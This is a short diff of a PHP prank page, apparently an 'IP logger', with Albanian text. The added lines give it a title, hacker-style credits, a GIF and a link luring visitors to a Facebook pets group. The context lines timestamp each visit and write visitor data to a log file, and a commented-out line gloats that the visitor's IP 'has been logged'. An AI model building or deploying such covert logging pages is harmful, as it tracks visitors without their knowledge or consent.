@@ -1,3 +1,7 @@
+<title>MAQAAA</title>
+<?php
+// MAQA (C) Coded and managed by K|nG ; akukaj@msn.com
+// All gretz to K|nG and Punisher
 /*niti code */
 
 $koha = date('d.m.Y h:i:s A');
@@ -49,3 +53,7 @@ fwrite($file, $data . "\n"); //Write data to file
 fclose($file); // Close the file
 // echo "Your IP adddress <b>$ip</b> has been logged :D";
 	?>
+<br><br><br><br><br><br>
+<center><h1><img alt="" src="http://i.imgur.com/oPW0DHA.gif" style="height:265px; width:403px" /><br />
+<br />
+Cfare maqeee :P</h1><br><a href="http://facebook.com/groups/boutpets"><b>Bashkangjitju grupit te kafsheve ne facebook! I love my pets >>> Kliko ketu</b></a></center>
